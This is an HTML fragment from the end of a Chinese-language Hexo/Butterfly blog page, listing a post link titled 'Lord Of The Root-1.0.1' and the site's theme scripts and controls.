href="/2023/01/26/Lord-Of-The-Root-1-0-1/" title="Lord Of The Root-1.0.1">Lord Of The Root-1.0.1</a><time datetime="2023-01-26T09:58:02.000Z" title="发表于 2023-01-26 17:58:02">2023-01-26</time></div></div></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #ccc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 0000FF</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
